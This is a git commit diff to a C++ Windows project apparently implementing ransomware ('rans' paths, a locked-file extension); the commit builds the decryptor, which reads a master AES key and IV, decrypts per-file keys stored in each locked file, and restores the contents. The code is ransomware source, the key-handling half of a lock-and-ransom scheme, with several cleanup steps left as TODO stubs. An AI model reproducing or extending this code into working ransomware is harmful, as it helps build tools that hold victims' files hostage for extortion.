bb780b49805dba5155208b7248974a668571b34e
orargaman <orargaman@gmail.com>
2017-04-21 19:39:11 +0300

    Decryption reads master iv and key and decrypts keys and iv from files start
    Signed-off-by: orargaman <orargaman@gmail.com>

--- Squanched/Decryption.cpp
+++ Squanched/Decryption.cpp
@@ -1,26 +1,48 @@
 
 #include "Decryption.h"
 #ifndef ENC
-void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD CipherTextLength, BYTE paddingSize)
+
+DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
+
+DWORD DecryptKeyIV(PBYTE keyIV, PBYTE* keyIVBuff,  PBYTE masterKey, PBYTE masterIV)
 {
 	DWORD status;
-	PBYTE   TempInitVector = NULL;
-	DWORD   TempInitVectorLength = 0;
-	DWORD   ResultLength = 0;
-
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
-	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
+	BCRYPT_KEY_HANDLE keyHandle;
+	status = getKeyHandle(masterKey, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
 		//TODO cleanup
+	}
+	DWORD  resSize;
+	//CHECK IF NEEDED V
+	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if (NULL == tmpIv) {
+		//TODO cleanup
+	}
+	memcpy(tmpIv, masterIV, IV_LEN);
+	status = BCryptDecrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, nullptr, tmpIv, IV_LEN, *keyIVBuff, KEY_LEN + IV_LEN, &resSize, 0);
+	if (!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+
+	return status;
+}
+
+DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
+{
+	DWORD status;
+	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
+	if (!NT_SUCCESS(status)) {
+		return status;
 	}
 	ULONG res;
 	char blockLen[50] = { 0 };
 	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50, &res, 0);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		return status;
 	}
 	//TODO verify compatible block length
-	BCRYPT_KEY_HANDLE keyHandle;
+	
 
 	status = BCryptGenerateSymmetricKey(
 		aesHandle,                  // Algorithm provider handle
@@ -32,12 +54,25 @@ void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD Ciphe
 		0);                         // Flags
 	if (!NT_SUCCESS(status))
 	{
-		//TODO cleanup
+		return status;
 	}
 	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		return status;
 	}
+	return status;
+}
+
+void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD CipherTextLength, BYTE paddingSize)
+{
+	DWORD status;
+	PBYTE   TempInitVector = NULL;
+	DWORD   TempInitVectorLength = 0;
+	DWORD   ResultLength = 0;
+
+	BCRYPT_KEY_HANDLE keyHandle;
+	BCRYPT_ALG_HANDLE aesHandle = nullptr;
+	status = getKeyHandle(key, keyHandle, aesHandle);
 
 	DWORD plainSize, resSize;
 	//CHECK IF NEEDED V
@@ -76,7 +111,27 @@ void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD Ciphe
 
 int main()
 {
+	PBYTE masterIV = nullptr, masterKey = nullptr;
+	masterIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if(masterIV == nullptr)
+	{
+		//TODO cleanup
+	}
+	masterKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
+	if (masterKey == nullptr)
+	{
+		//TODO cleanup
+	}
+	string pathToMasters = "";
+	std::ifstream masterKeyIVFile;
+	masterKeyIVFile.open(pathToMasters, std::ios::binary);
+	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
+	masterKeyIVFile.read((char*)masterIV, IV_LEN);
+	masterKeyIVFile.close();
+
 	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans1.txt" + string(LOCKED_EXTENSION);
+	PBYTE keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+	PBYTE keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	PBYTE iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
 	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN - IV_DIGITS_NUM;
@@ -89,9 +144,13 @@ int main()
 	char paddingSizeTmpBuff[IV_DIGITS_NUM + 1] = {0};
 	ifile.read(paddingSizeTmpBuff, IV_DIGITS_NUM);
 	BYTE paddingSize = strtol(paddingSizeTmpBuff,NULL,10);
-	ifile.read((char*)iv, IV_LEN);
-	ifile.read((char*)key, KEY_LEN);
+	ifile.read((char*)keyIV, IV_LEN+KEY_LEN);
 	ifile.read((char*)cipher, cipherSize);
+	ifile.close();
+	//TODO add status read
+	DecryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
+	memcpy(key, keyIVBuff, KEY_LEN);
+	memcpy(iv, keyIVBuff + KEY_LEN, IV_LEN);
 	DecryptData(path,key,iv,cipher,cipherSize, paddingSize);
 
 	//HeapFree(cipher);
